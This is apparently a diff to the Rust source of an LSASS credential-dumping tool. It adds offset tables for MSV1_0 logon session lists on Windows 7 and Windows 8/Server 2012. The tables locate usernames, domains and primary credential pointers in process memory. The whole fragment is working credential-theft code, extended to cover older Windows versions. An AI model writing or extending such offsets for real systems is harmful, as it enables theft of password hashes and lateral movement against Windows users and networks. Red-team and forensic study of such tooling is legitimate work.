@@ -20,13 +20,15 @@ struct MsvOffsets {
 // credentials_ptr = 0 means "auto-detect by scanning for Primary signature".
 const MSV_OFFSET_VARIANTS: &[MsvOffsets] = &[
     // Variant 0: Empirical NlpActiveLogonTable (Win10 19041+/22H2)
-    // Discovered via hex dump: LUID at +0x2C (u64), UserName at +0x48, Domain at +0x58
-    // credentials_ptr unknown -> auto-detect
     MsvOffsets { flink: 0x00, luid: 0x2C, username: 0x48, domain: 0x58, credentials_ptr: 0 },
     // Variant 1: MSV1_0_LIST_63 base (Win10 1507-1511)
     MsvOffsets { flink: 0x00, luid: 0x70, username: 0x80, domain: 0x90, credentials_ptr: 0xE8 },
     // Variant 2: MSV1_0_LIST_63 extended (Win10 1607+)
     MsvOffsets { flink: 0x00, luid: 0x90, username: 0xA8, domain: 0xB8, credentials_ptr: 0x108 },
+    // Variant 3: MSV1_0_LIST_62 (Win8/8.1 / Server 2012/2012R2)
+    MsvOffsets { flink: 0x00, luid: 0x70, username: 0x90, domain: 0xA0, credentials_ptr: 0xF8 },
+    // Variant 4: MSV1_0_LIST_61 (Win7 / Server 2008 R2)
+    MsvOffsets { flink: 0x00, luid: 0x30, username: 0x40, domain: 0x50, credentials_ptr: 0xA0 },
 ];
 
 /// Primary credential offsets within MSV1_0_PRIMARY_CREDENTIAL.
